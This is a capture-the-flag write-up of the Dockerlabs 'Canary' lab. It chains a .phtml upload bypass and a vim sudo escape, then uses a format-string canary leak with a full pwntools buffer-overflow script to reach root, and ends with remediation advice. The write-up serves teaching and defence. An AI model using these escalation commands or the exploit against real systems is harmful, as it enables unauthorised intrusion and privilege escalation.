# Canary - Dockerlabs Write-Up

## Executive Summary

The **Canary** laboratory is an advanced security exercise that simulates a vulnerable environment where an attacker exploits multiple layers of defense to gain administrative access. The laboratory integrates classical vulnerabilities (such as file uploads and privilege escalation) with modern protections (such as Stack Canary) and sophisticated exploitation techniques. The ultimate objective is to demonstrate how attackers can circumvent security mechanisms through binary analysis, identification of buffer overflow vulnerabilities, and bypassing protections implemented at the operating system level.

---

## 1. Initial Reconnaissance

### 1.1 Port Scanning

The laboratory begins with a comprehensive port scan that reveals only port 80 (HTTP) as active on the target system:

![alt text](img/1-nmap.png)

### 1.2 Directory Enumeration

Following the initial scan, **gobuster** is used to enumerate directories and files exposed by the web service:

![alt text](img/2-gobuster.png)

---

## 2. Initial Exploitation

### 2.1 Web Service Identification

When accessing the HTTP service, a page is presented with the indication "upload your file", suggesting the presence of file upload functionality:

![alt text](img/3-http.png)

### 2.2 File Upload Interface

An interface is located that allows uploading files to the server:

![alt text](img/4-uploadhttp.png)

### 2.3 Vulnerability: File Extension Validation Bypass

An attempt is made to upload a PHP reverse shell script, but the server rejects the `.php` extension:

![alt text](img/5-phpDenied.png)

The `.phtml` extension is tested, which is executed by the PHP server and is accepted:

![alt text](img/6-phtmlAcepted.png)

### 2.4 Obtaining a Reverse Shell

After validating the upload, a specialized PHP script is sent under the `.phtml` extension, obtaining shell access as the `www-data` user:

![alt text](img/7-reverseShell.png)

---

## 3. Privilege Escalation: First Stage (www-data → jerry)

### 3.1 Analysis of sudo Permissions

Commands that can be executed without a password are verified using `sudo -l`:

![alt text](img/8-Sudo-lWWWDATA.png)

It is observed that it is possible to execute **vim** without providing a password.

### 3.2 System User Identification

The system users that have permissions to execute shell are enumerated:

![alt text](img/9-catEtcPasswd.png)

The user **jerry** is identified as a candidate for lateral movement.

### 3.3 Vulnerability: vim Exploitation

Vim allows the execution of system commands through the ex mode. This is leveraged to execute a shell as **jerry** using sudo permissions:

```bash
sudo -u jerry /usr/bin/vim -c ':! /bin/bash'
```

![alt text](img/11-VimForjerry.png)

![alt text](img/11-Jerry.png)

### 3.4 Shell Stabilization

The obtained shell is limited, so stabilization is performed using TTY techniques:

![alt text](img/12-TTYjerry.png)

---

## 4. Analysis of Vulnerable Binaries

### 4.1 sudo Permissions of jerry User

The sudo permissions available for jerry are verified again:

![alt text](img/13-Sudo-lJerry.png)

Two executable binaries are identified:
- **suma** - Apparently a number addition program
- **command_exec.py** - Python script with command execution functionality

### 4.2 Analysis of the "suma" Binary

The binary content is analyzed using the `strings` command:

![alt text](<img/14-strings suma.png>)

Initial execution of the binary shows an interface requesting user input:

![alt text](img/15-sudoSuma.png)

### 4.3 Analysis of the command_exec.py Script

The Python script is examined and it is discovered that it contains functionality to execute commands if a `flag.txt` file contains the value `ACTIVE`:

![alt text](<img/16 catCommandExec.png>)

---

## 5. Advanced Binary Analysis

### 5.1 Reverse Engineering of the suma Binary

The binary is transferred to the attacking machine for detailed analysis using **Ghidra**:

![alt text](img/17-GuidraSrumaMain.png)

It is determined that the binary executes an addition form, but it is suspected that it contains additional functionality not apparent in normal execution.

### 5.2 Identification of the set_flag Function

Through exhaustive analysis in Ghidra, a **set_flag** function is located that modifies the contents of the `flag.txt` file:

![alt text](img/17-GuidraSumaSetFlag.png)

This function is the key to activating the functionality of `command_exec.py` and obtaining command execution as root.

---

## 6. Vulnerability: Buffer Overflow Protected with Stack Canary

### 6.1 Locating the set_flag Function

The memory address of the function is obtained using `objdump`:

![alt text](img/18-ObjDump.png)

### 6.2 Analysis with Debugger

The binary is analyzed with GDB:

![alt text](img/19-GDB.png)

### 6.3 Protection Mechanism: Stack Canary

After attempting traditional buffer overflow exploitation, a **stack canary** protection is identified that validates the integrity of the stack frame. This mechanism prevents simple buffer overflow.

### 6.4 Vulnerability: Format String

It is discovered that the username field is processed by `printf` without validation, creating a **format string** vulnerability:

```c
printf(username);  // Vulnerable
```

This vulnerability allows reading stack data using specifiers like `%p`.

---

## 7. Stack Canary Bypass via Format String

### 7.1 Exfiltration of the Canary Value

The Format String vulnerability is used to extract the canary value from the stack. A fuzzing script attempts multiple stack positions until locating the value:

![alt text](img/21-findCanary.png)

The canary value is obtained in hexadecimal format (in this case, `69`).

### 7.2 Exploit Construction

The memory distribution is calculated:
- **264 bytes**: Vulnerable buffer (before the canary)
- **8 bytes**: The canary
- **8 bytes**: To get the Return Address (RIP)

A Python script is developed that automates the process:

```bash
#!/usr/bin/python3

from pwn import *

def main():

    def start():

        if args.GDB:
            return gdb.debug(filename, gdbscript=gdbscript)
        elif args.REMOTE:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process(["sudo", filename])

    filename = "/opt/suma"

    elf = context.binary = ELF(filename, checksec=False)
    context.log_level = "error"

    gdbscript = """
    """


    canary_offset = 264
    rip_offset = 8


    p = start()

    p.sendlineafter(b':', b'%69$p')

    p.recvuntil(b'Hola, ')
    canary = int(p.recvline().strip(), 16)


    payload = flat(

            b'A'*canary_offset,
            canary,
            b'A'*rip_offset,
            elf.functions.set_flag
    )


    p.sendlineafter(b':', payload)

    print(p.recvall())

    p.close()


if __name__ == '__main__':

    main()
```

**Credit**: Script obtained from ASMODAX.

### 7.3 Exploit Execution

The exploitation script is executed:

![alt text](img/21-ScriptOverflow.png)

---

## 8. Final Privilege Escalation: Execution as root

### 8.1 Script Transfer

The script is transferred through an HTTP server:

```bash
python3 -m http.server 8000
```

And downloaded on the target machine with wget:

![alt text](img/22-OverflowSended.png)

### 8.2 Dependency Installation

The **pwntools** library necessary to run the script is installed:

![alt text](img/23-pwntoolsIntall.png)

### 8.3 Final Execution and root Access

The script is run modifying the `flag.txt` file, activating the functionality of `command_exec.py`. Finally, a shell is obtained as root:

![alt text](img/root.png)

---

## 9. Security Recommendations

### 9.1 Vulnerability: File Extension Validation Bypass

**Description**: The server allowed the upload of executable files by bypassing extension validation (.php rejected, but .phtml accepted).

**Recommendation**: 
- Implement whitelist validation of file extensions on both server and client
- Store files outside the web directory or on a non-executable partition
- Configure the web server not to execute scripts in upload directories (disable_functions, remove_handler in Apache)
- Rename uploaded files with a safe suffix and generate random names
- Implement MIME type validation and file signature verification (magic bytes)
- Set restrictive permissions (chmod 644) on uploaded files
- Perform validations on the server side; never rely solely on client-side validation

### 9.2 Vulnerability: Improper sudo Permissions

**Description**: The `www-data` user could execute `vim` without a password, allowing privilege escalation through commands embedded in vim.

**Recommendation**:
- Never allow the execution of text editors or interactive shells via sudo without a password
- Implement a whitelist of specific commands in sudoers, not complete binaries
- Use `sudo -u user /path/command --specific-arguments` if user change is required
- Configure audit logging for all sudo executions using `auditd` or `/var/log/auth.log`
- Consider using alternative tools like `runuser` with more granular restrictions
- Periodically review sudoers configuration using `visudo -c`
- Implement timeout for sudo sessions

### 9.3 Vulnerability: Format String in Binary

**Description**: The `suma` binary uses `printf` with unvalidated user input, allowing memory reading through format specifiers.

**Recommendation**:
- Use string literals instead of format arguments: `printf("%s", buffer);` instead of `printf(buffer);`
- Compile with security flags: `-Wformat -Wformat-security -Werror=format-security`
- Implement strict input validation
- Use safe print functions with explicit specifiers
- Perform code audit to identify vulnerable patterns
- Implement runtime protections (ASLR, DEP/NX)
- Use static analysis tools like `clang-analyzer` and `cppcheck`

### 9.4 Vulnerability: Stack Canary Bypass via Format String

**Description**: Although Stack Canary provides protection against buffer overflow, it was bypassed by exfiltrating the canary value through Format String vulnerabilities.

**Recommendation**:
- Implement defense in depth: Stack Canary + ASLR + DEP/NX + CFI
- Use cryptographically-based, non-predictable canary values
- Compile with `-fstack-protector-all` for maximum function coverage
- Implement Control Flow Guard (CFG) on Windows or Shadow Stack on Linux
- Perform regular fuzzing and security testing using tools like AFL and libFuzzer
- Consider using memory-safe languages (Rust, Go) for critical code
- Implement runtime memory anomaly monitoring with ASAN/MSAN
- Use tools like Valgrind to detect memory vulnerabilities during development

### 9.5 Vulnerability: Buffer Overflow in SUID Binary

**Description**: The `suma` binary is executable as root through sudo permissions, allowing arbitrary code execution with elevated privileges through buffer overflow exploitation.

**Recommendation**:
- Remove unnecessary SUID files or replace with alternative solutions
- Use Linux capabilities (`CAP_NET_BIND_SERVICE`, etc.) instead of SUID binaries
- Compile code with buffer overflow protections (avoid `-fno-stack-protector`)
- Implement Address Space Layout Randomization (ASLR) at system level
- Use Data Execution Prevention (DEP/NX bit)
- Perform static security analysis of code before compilation using `Clang Static Analyzer`
- Limit access to potentially vulnerable binaries through file permissions and SELinux/AppArmor
- Use `-fPIE` to compile position-independent executable binaries

### 9.6 Vulnerability: Hidden Function Without Access Control

**Description**: The `set_flag` function in the binary was undocumented "hidden" functionality that allows modifying critical files without authentication.

**Recommendation**:
- Implement role-based access control (RBAC) for sensitive functions
- Remove hidden or undocumented functions from production code
- Implement permission validation for all file write operations
- Use audit logs to track changes to critical files using `auditd`
- Implement file integrity through SHA-256 checksums or digital signatures
- Consider using SELinux or AppArmor for system-level access restrictions
- Perform code reviews before production deployment
- Implement separate read and write access (principle of segregation of duties)

### 9.7 Vulnerability: Insecure Command Execution Configuration

**Description**: The `command_exec.py` file allowed arbitrary command execution based on a flag file with modifiable permissions.

**Recommendation**:
- Never allow arbitrary command execution in production code
- If command execution is required, use strict whitelist of allowed commands
- Implement sandboxing or containerization (Docker, Firejail) to limit code execution impact
- Use `subprocess.run()` with `shell=False` and explicit argument list in Python
- Validate and sanitize all user input before processing through regular expressions
- Implement logging and audit of all executed commands
- Consider using safe APIs instead of shell command execution
- Maintain minimum necessary permissions for scripts (principle of least privilege)
- Implement timeout to prevent commands that consume resources indefinitely
- Run processes as non-privileged dedicated users

---

## Conclusion

The Canary laboratory demonstrates the importance of multiple security layers and how vulnerabilities can be chained to completely compromise a system. The combination of insufficient validation, incorrect permissions, and incomplete protections allowed the attacker to progress from limited access as `www-data` to complete control as `root`. Implementation of the above recommendations would create a significantly more secure and resilient environment against this type of attacks.
